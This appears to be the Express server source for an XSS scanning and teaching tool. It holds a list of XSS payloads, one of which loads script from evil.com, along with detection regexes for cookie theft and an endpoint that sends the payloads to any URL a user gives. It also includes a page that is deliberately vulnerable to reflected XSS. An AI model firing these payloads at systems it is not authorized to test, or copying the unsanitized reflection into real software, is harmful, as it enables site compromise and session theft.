const express = require('express')
const cors = require('cors')
const { v4: uuidv4 } = require('uuid')
const https = require('https')
const http = require('http')
const { URL } = require('url')
const fs = require('fs')
const path = require('path')

const app = express()
const PORT = 7031

app.use(cors())
app.use(express.json())

// Persistent scan history
const dataDir = path.join(__dirname, 'data')
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true })
const historyPath = path.join(dataDir, 'scans.json')

function loadHistory() {
  try { if (fs.existsSync(historyPath)) return JSON.parse(fs.readFileSync(historyPath, 'utf8')) } catch (e) {}
  return { scans: [] }
}
function saveHistory(data) {
  if (data.scans.length > 100) data.scans = data.scans.slice(0, 100)
  fs.writeFileSync(historyPath, JSON.stringify(data, null, 2))
}

// XSS vulnerability patterns for SOURCE CODE scanning
const vulnerabilityPatterns = [
  { pattern: 'innerHTML', severity: 'critical', type: 'DOM XSS', desc: 'Direct innerHTML assignment — allows arbitrary HTML/script injection' },
  { pattern: 'document.write', severity: 'critical', type: 'DOM XSS', desc: 'document.write usage — can inject scripts into page' },
  { pattern: 'eval(', severity: 'critical', type: 'Code Injection', desc: 'eval function usage — executes arbitrary code' },
  { pattern: 'outerHTML', severity: 'high', type: 'DOM XSS', desc: 'outerHTML manipulation — replaces element with unsanitized HTML' },
  { pattern: '.html(', severity: 'high', type: 'jQuery XSS', desc: 'jQuery .html() method — inserts raw HTML without encoding' },
  { pattern: 'v-html', severity: 'medium', type: 'Vue XSS', desc: 'Vue v-html directive — renders raw HTML' },
  { pattern: 'dangerouslySetInnerHTML', severity: 'medium', type: 'React XSS', desc: 'React dangerous HTML — bypasses React\'s escaping' }
]

// XSS PAYLOAD detection patterns (for user input scanning)
const xssPayloadPatterns = [
  { pattern: /<script[\s>]/i, severity: 'critical', type: 'Reflected XSS', desc: 'Script tag injection — executes JavaScript' },
  { pattern: /javascript\s*:/i, severity: 'critical', type: 'JavaScript URI', desc: 'JavaScript protocol in URL — code execution via link' },
  { pattern: /on\w+\s*=/i, severity: 'high', type: 'Event Handler XSS', desc: 'Event handler injection (onerror, onload, onclick, etc.)' },
  { pattern: /<iframe/i, severity: 'high', type: 'Frame Injection', desc: 'Iframe injection — can load malicious pages' },
  { pattern: /<img[^>]+onerror/i, severity: 'high', type: 'IMG XSS', desc: 'Image tag with error handler — executes on load failure' },
  { pattern: /<svg[^>]+onload/i, severity: 'high', type: 'SVG XSS', desc: 'SVG with onload — executes when SVG renders' },
  { pattern: /document\.cookie/i, severity: 'critical', type: 'Cookie Theft', desc: 'Attempts to access cookies — session hijacking' },
  { pattern: /document\.location/i, severity: 'high', type: 'Redirect XSS', desc: 'Attempts to redirect page — phishing attack' },
  { pattern: /<embed/i, severity: 'medium', type: 'Embed Injection', desc: 'Embed tag injection' },
  { pattern: /<object/i, severity: 'medium', type: 'Object Injection', desc: 'Object tag injection' },
  { pattern: /expression\s*\(/i, severity: 'medium', type: 'CSS XSS', desc: 'CSS expression — executes code via style' },
  { pattern: /data\s*:\s*text\/html/i, severity: 'high', type: 'Data URI XSS', desc: 'Data URI with HTML — embeds executable content' },
  { pattern: /\\u00[0-9a-f]{2}/i, severity: 'medium', type: 'Unicode Escape', desc: 'Unicode escape sequences — bypasses basic filters' },
  { pattern: /&#\d+;|&#x[0-9a-f]+;/i, severity: 'medium', type: 'HTML Entity Encoding', desc: 'HTML entity encoding — bypasses simple string filters' }
]

// Scan code for XSS vulnerabilities — detects both source code issues AND XSS payloads
app.post('/api/scan', (req, res) => {
  const { code, language } = req.body
  const vulnerabilities = []

  if (code) {
    const lines = code.split('\n')
    lines.forEach((line, index) => {
      // Check source code vulnerability patterns
      vulnerabilityPatterns.forEach(vuln => {
        if (line.toLowerCase().includes(vuln.pattern.toLowerCase())) {
          vulnerabilities.push({
            id: uuidv4(),
            line: index + 1,
            severity: vuln.severity,
            type: vuln.type,
            description: vuln.desc,
            code: line.trim(),
            recommendation: getRecommendation(vuln.pattern)
          })
        }
      })

      // Check for XSS payload patterns in the input
      xssPayloadPatterns.forEach(vuln => {
        if (vuln.pattern.test(line)) {
          vulnerabilities.push({
            id: uuidv4(),
            line: index + 1,
            severity: vuln.severity,
            type: vuln.type,
            description: vuln.desc,
            code: line.trim(),
            recommendation: 'Sanitize this input — it contains an XSS attack payload'
          })
        }
      })
    })
  }

  const scanResult = {
    success: true,
    scanId: uuidv4(),
    language,
    totalLines: code ? code.split('\n').length : 0,
    vulnerabilities,
    riskLevel: vulnerabilities.some(v => v.severity === 'critical') ? 'critical' :
               vulnerabilities.some(v => v.severity === 'high') ? 'high' :
               vulnerabilities.length > 0 ? 'medium' : 'safe',
    scannedAt: new Date().toISOString()
  }

  // Save to history
  const history = loadHistory()
  history.scans.unshift({
    scanId: scanResult.scanId,
    language,
    vulnerabilityCount: vulnerabilities.length,
    riskLevel: scanResult.riskLevel,
    scannedAt: scanResult.scannedAt
  })
  saveHistory(history)

  res.json(scanResult)
})

function getRecommendation(pattern) {
  const recommendations = {
    'innerHTML': 'Use textContent or sanitize with DOMPurify',
    'document.write': 'Use DOM manipulation methods instead',
    'eval(': 'Never use eval() with user input',
    'outerHTML': 'Use safe DOM manipulation methods',
    '.html(': 'Use .text() or sanitize input first',
    'v-html': 'Sanitize content before using v-html',
    'dangerouslySetInnerHTML': 'Use DOMPurify to sanitize content'
  }
  return recommendations[pattern] || 'Sanitize all user input'
}

// Sanitize input
app.post('/api/sanitize', (req, res) => {
  const { input, methods } = req.body
  let output = input

  if (methods.includes('htmlEscape')) {
    output = output
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;')
  }

  if (methods.includes('removeScripts')) {
    output = output.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
  }

  if (methods.includes('removeEvents')) {
    output = output.replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')
  }

  res.json({
    success: true,
    original: input,
    sanitized: output,
    methodsApplied: methods
  })
})

// Get XSS types information
app.get('/api/xss-types', (req, res) => {
  res.json({
    success: true,
    types: [
      {
        id: 'reflected',
        name: 'Reflected XSS',
        description: 'Script is reflected off a web server in error messages, search results, etc.',
        persistence: 'Non-persistent',
        severity: 'high',
        example: 'https://site.com/search?q=<script>alert(1)</script>'
      },
      {
        id: 'stored',
        name: 'Stored XSS',
        description: 'Script is permanently stored on the target server (database, message forums, etc.)',
        persistence: 'Persistent',
        severity: 'critical',
        example: 'Malicious comment stored in database'
      },
      {
        id: 'dom',
        name: 'DOM-based XSS',
        description: 'Attack payload is executed by modifying the DOM in victim\'s browser',
        persistence: 'Non-persistent',
        severity: 'high',
        example: 'URL fragment manipulation: #<script>alert(1)</script>'
      }
    ]
  })
})

// Get defense techniques
app.get('/api/defenses', (req, res) => {
  res.json({
    success: true,
    defenses: [
      { id: 'inputValidation', name: 'Input Validation', effectiveness: 'high' },
      { id: 'outputEncoding', name: 'Output Encoding', effectiveness: 'high' },
      { id: 'csp', name: 'Content Security Policy', effectiveness: 'very high' },
      { id: 'httpOnly', name: 'HttpOnly Cookies', effectiveness: 'medium' },
      { id: 'sanitization', name: 'HTML Sanitization', effectiveness: 'high' }
    ]
  })
})

// XSS Payloads for testing
const xssPayloads = [
  { name: 'Basic Script', payload: '<script>alert("XSS")</script>', category: 'script', severity: 'critical' },
  { name: 'IMG Onerror', payload: '<img src=x onerror="alert(1)">', category: 'event', severity: 'high' },
  { name: 'SVG Onload', payload: '<svg onload="alert(1)">', category: 'event', severity: 'high' },
  { name: 'Body Onload', payload: '<body onload="alert(1)">', category: 'event', severity: 'high' },
  { name: 'Input Autofocus', payload: '<input onfocus=alert(1) autofocus>', category: 'event', severity: 'medium' },
  { name: 'Iframe JavaScript', payload: '<iframe src="javascript:alert(1)">', category: 'javascript', severity: 'high' },
  { name: 'A Href JavaScript', payload: '<a href="javascript:alert(1)">click</a>', category: 'javascript', severity: 'medium' },
  { name: 'Event Handler', payload: '<div onmouseover="alert(1)">hover</div>', category: 'event', severity: 'medium' },
  { name: 'Script Src', payload: '<script src="http://evil.com/xss.js"></script>', category: 'external', severity: 'critical' },
  { name: 'Object Tag', payload: '<object data="javascript:alert(1)">', category: 'javascript', severity: 'high' },
  { name: 'Embed Tag', payload: '<embed src="javascript:alert(1)">', category: 'javascript', severity: 'high' },
  { name: 'Form Action', payload: '<form action="javascript:alert(1)"><input type=submit>', category: 'javascript', severity: 'medium' },
  { name: 'Details Tag', payload: '<details ontoggle="alert(1)" open>', category: 'html5', severity: 'medium' },
  { name: 'Video Onerror', payload: '<video><source onerror="alert(1)">', category: 'html5', severity: 'medium' },
  { name: 'Audio Onerror', payload: '<audio src=x onerror="alert(1)">', category: 'html5', severity: 'medium' },
  { name: 'Marquee Onstart', payload: '<marquee onstart="alert(1)">', category: 'deprecated', severity: 'low' },
  { name: 'Style Expression', payload: '<div style="background:url(javascript:alert(1))">', category: 'css', severity: 'medium' },
  { name: 'Data URL', payload: '<a href="data:text/html,<script>alert(1)</script>">click</a>', category: 'data', severity: 'high' },
  { name: 'Base64 Script', payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>', category: 'encoded', severity: 'high' },
  { name: 'Unicode Escape', payload: '<script>\\u0061lert(1)</script>', category: 'encoded', severity: 'medium' }
]

// Get fix recommendations for vulnerabilities
function getFixRecommendation(payload) {
  const recommendations = {
    'script': {
      problem: 'Script tag injection - allows arbitrary JavaScript execution',
      fix: 'Implement Content Security Policy (CSP) with script-src directive',
      code: `// Add CSP Header
Content-Security-Policy: script-src 'self';

// Or in Express.js:
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "script-src 'self'");
  next();
});`,
      priority: 'CRITICAL'
    },
    'event': {
      problem: 'Event handler injection - executes JavaScript on DOM events',
      fix: 'Sanitize HTML output and remove event handlers',
      code: `// Use DOMPurify to sanitize
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(userInput, {
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus']
});

// Or escape HTML entities
function escapeHtml(text) {
  const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'};
  return text.replace(/[&<>"']/g, m => map[m]);
}`,
      priority: 'HIGH'
    },
    'javascript': {
      problem: 'JavaScript URI injection - executes code via javascript: protocol',
      fix: 'Validate and whitelist allowed URL protocols',
      code: `// Validate URLs
function sanitizeUrl(url) {
  const allowed = ['http:', 'https:', 'mailto:'];
  try {
    const parsed = new URL(url);
    if (!allowed.includes(parsed.protocol)) {
      return '#'; // Safe fallback
    }
    return url;
  } catch {
    return '#';
  }
}`,
      priority: 'HIGH'
    },
    'html5': {
      problem: 'HTML5 element event injection - modern attack vectors',
      fix: 'Use strict Content Security Policy and sanitize inputs',
      code: `// Strict CSP
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self';

// Sanitize with whitelist
const allowedTags = ['p', 'br', 'strong', 'em', 'a'];
const clean = DOMPurify.sanitize(input, { ALLOWED_TAGS: allowedTags });`,
      priority: 'MEDIUM'
    },
    'css': {
      problem: 'CSS-based XSS - style injection attack',
      fix: 'Sanitize CSS values and use Content Security Policy',
      code: `// CSP for styles
Content-Security-Policy: style-src 'self';

// Never allow user input in style attributes
// Use CSS classes instead of inline styles`,
      priority: 'MEDIUM'
    },
    'encoded': {
      problem: 'Encoded payload bypass - evades basic filters',
      fix: 'Decode input before validation, use comprehensive sanitization',
      code: `// Decode before validation
const decoded = decodeURIComponent(input);
const sanitized = DOMPurify.sanitize(decoded);

// Use multiple encoding checks
function normalizeInput(input) {
  let result = input;
  while (result !== decodeURIComponent(result)) {
    result = decodeURIComponent(result);
  }
  return result;
}`,
      priority: 'HIGH'
    },
    'external': {
      problem: 'External script loading - loads malicious remote code',
      fix: 'Block external scripts with CSP',
      code: `// Block external scripts
Content-Security-Policy: script-src 'self';

// Or use Subresource Integrity for trusted CDNs
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-hash..."
        crossorigin="anonymous"></script>`,
      priority: 'CRITICAL'
    },
    'data': {
      problem: 'Data URL attack - embeds malicious content in URL',
      fix: 'Block data: URLs in CSP',
      code: `// Block data URLs
Content-Security-Policy: default-src 'self'; img-src 'self' https:;

// Validate href attributes
if (href.startsWith('data:')) {
  href = '#'; // Block
}`,
      priority: 'HIGH'
    },
    'deprecated': {
      problem: 'Deprecated HTML element abuse',
      fix: 'Sanitize to remove deprecated elements',
      code: `// Remove deprecated tags
const clean = DOMPurify.sanitize(input, {
  FORBID_TAGS: ['marquee', 'blink', 'bgsound']
});`,
      priority: 'LOW'
    }
  }
  return recommendations[payload.category] || recommendations['event']
}

// Make HTTP request to test URL
function testUrl(targetUrl, payload) {
  return new Promise((resolve) => {
    try {
      const testUrlWithPayload = targetUrl.includes('?')
        ? `${targetUrl}${encodeURIComponent(payload.payload)}`
        : `${targetUrl}?test=${encodeURIComponent(payload.payload)}`

      const parsedUrl = new URL(testUrlWithPayload)
      const protocol = parsedUrl.protocol === 'https:' ? https : http

      const options = {
        hostname: parsedUrl.hostname,
        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
        path: parsedUrl.pathname + parsedUrl.search,
        method: 'GET',
        timeout: 5000,
        headers: {
          'User-Agent': 'XSS-Shield-Scanner/1.0 (Educational)',
          'Accept': 'text/html,application/xhtml+xml'
        },
        rejectUnauthorized: false // Allow self-signed certs for testing
      }

      const req = protocol.request(options, (response) => {
        let data = ''
        response.on('data', chunk => data += chunk)
        response.on('end', () => {
          // Check if payload is reflected in response
          const isReflected = data.includes(payload.payload) ||
                             data.includes(payload.payload.replace(/"/g, '&quot;')) ||
                             data.includes(payload.payload.replace(/</g, '&lt;'))

          // Check for security headers
          const headers = response.headers
          const hasCSP = !!headers['content-security-policy']
          const hasXSSProtection = !!headers['x-xss-protection']
          const hasContentType = headers['content-type']?.includes('text/html')

          resolve({
            payload: payload.name,
            payloadCode: payload.payload,
            category: payload.category,
            severity: payload.severity,
            vulnerable: isReflected && !hasCSP,
            reflected: isReflected,
            statusCode: response.statusCode,
            securityHeaders: {
              csp: hasCSP,
              xssProtection: hasXSSProtection,
              contentType: hasContentType
            },
            recommendation: getFixRecommendation(payload)
          })
        })
      })

      req.on('error', (err) => {
        resolve({
          payload: payload.name,
          payloadCode: payload.payload,
          category: payload.category,
          severity: payload.severity,
          vulnerable: false,
          error: err.message,
          recommendation: getFixRecommendation(payload)
        })
      })

      req.on('timeout', () => {
        req.destroy()
        resolve({
          payload: payload.name,
          payloadCode: payload.payload,
          category: payload.category,
          severity: payload.severity,
          vulnerable: false,
          error: 'Request timeout',
          recommendation: getFixRecommendation(payload)
        })
      })

      req.end()
    } catch (err) {
      resolve({
        payload: payload.name,
        payloadCode: payload.payload,
        category: payload.category,
        severity: payload.severity,
        vulnerable: false,
        error: err.message,
        recommendation: getFixRecommendation(payload)
      })
    }
  })
}

// XSS Auto-Test Endpoint - Real testing
app.post('/api/xss-test', async (req, res) => {
  const { targetUrl } = req.body

  if (!targetUrl) {
    return res.status(400).json({ success: false, error: 'Target URL is required' })
  }

  console.log(`[XSS-TEST] Starting scan for: ${targetUrl}`)

  const results = []
  const startTime = Date.now()

  // Test each payload
  for (const payload of xssPayloads) {
    const result = await testUrl(targetUrl, payload)
    results.push(result)
    console.log(`[XSS-TEST] ${payload.name}: ${result.vulnerable ? 'VULNERABLE' : 'Protected'}`)
  }

  const endTime = Date.now()
  const vulnerabilities = results.filter(r => r.vulnerable)
  const securityHeaders = results[0]?.securityHeaders || {}

  // Generate summary
  const summary = {
    totalTests: results.length,
    vulnerableCount: vulnerabilities.length,
    protectedCount: results.length - vulnerabilities.length,
    criticalCount: vulnerabilities.filter(v => v.severity === 'critical').length,
    highCount: vulnerabilities.filter(v => v.severity === 'high').length,
    mediumCount: vulnerabilities.filter(v => v.severity === 'medium').length,
    lowCount: vulnerabilities.filter(v => v.severity === 'low').length,
    scanDuration: endTime - startTime,
    securityScore: Math.round(((results.length - vulnerabilities.length) / results.length) * 100)
  }

  // Generate overall recommendations
  const overallRecommendations = []
  if (!securityHeaders.csp) {
    overallRecommendations.push({
      priority: 'CRITICAL',
      title: 'Add Content Security Policy',
      description: 'CSP header is missing. This is the most effective XSS protection.',
      code: `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';`
    })
  }
  if (!securityHeaders.xssProtection) {
    overallRecommendations.push({
      priority: 'HIGH',
      title: 'Add X-XSS-Protection Header',
      description: 'Enable browser built-in XSS filter',
      code: `X-XSS-Protection: 1; mode=block`
    })
  }
  if (vulnerabilities.length > 0) {
    overallRecommendations.push({
      priority: 'CRITICAL',
      title: 'Implement Input Sanitization',
      description: 'Sanitize all user input before rendering',
      code: `// Use DOMPurify or similar library
const clean = DOMPurify.sanitize(userInput);`
    })
    overallRecommendations.push({
      priority: 'HIGH',
      title: 'Implement Output Encoding',
      description: 'Encode special characters when outputting to HTML',
      code: `function escapeHtml(text) {
  const map = {'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;'};
  return text.replace(/[&<>"']/g, m => map[m]);
}`
    })
  }

  res.json({
    success: true,
    targetUrl,
    scanId: uuidv4(),
    scannedAt: new Date().toISOString(),
    summary,
    securityHeaders,
    results,
    vulnerabilities,
    overallRecommendations
  })
})

// Get available payloads
app.get('/api/xss-payloads', (req, res) => {
  res.json({
    success: true,
    payloads: xssPayloads
  })
})

// Scan history
app.get('/api/history', (req, res) => {
  const history = loadHistory()
  res.json({ success: true, scans: history.scans })
})

app.delete('/api/history', (req, res) => {
  saveHistory({ scans: [] })
  res.json({ success: true })
})

// Built-in vulnerable test page for live XSS demo
app.get('/api/vulnerable-demo', (req, res) => {
  const userInput = req.query.q || ''
  // INTENTIONALLY VULNERABLE — reflects input without sanitization
  res.send(`<!DOCTYPE html>
<html><head><title>Vulnerable Demo Page</title>
<style>body{font-family:sans-serif;background:#1a1a2e;color:#eee;padding:2rem;max-width:600px;margin:0 auto}
h1{color:#e94560}input{width:100%;padding:.75rem;border:1px solid #555;border-radius:8px;background:#16213e;color:#eee;margin:.5rem 0}
button{background:#e94560;color:#fff;border:none;padding:.75rem 1.5rem;border-radius:8px;cursor:pointer}
.result{background:#16213e;border:1px solid #555;padding:1rem;border-radius:8px;margin-top:1rem;}</style></head>
<body><h1>Vulnerable Search Page</h1><p style="color:#e94560">⚠ This page is intentionally vulnerable for XSS testing</p>
<form method="GET" action="/api/vulnerable-demo"><input name="q" placeholder="Try: <script>alert('XSS')</script>" value="">
<button type="submit">Search</button></form>
${userInput ? `<div class="result"><p>Results for: ${userInput}</p><p style="color:#888">No results found.</p></div>` : ''}
</body></html>`)
})

// Health check
app.get('/api/health', (req, res) => {
  const history = loadHistory()
  res.json({
    status: 'ok',
    message: 'XSS Shield API running',
    version: '2.0.0',
    totalScans: history.scans.length,
    vulnerableTestPage: '/api/vulnerable-demo'
  })
})

app.listen(PORT, '0.0.0.0', () => {
  console.log(`
╔══════════════════════════════════════════════════════════════╗
║                XSS Shield Backend Server                      ║
╚══════════════════════════════════════════════════════════════╝
Server running on http://localhost:${PORT}
  `)
})
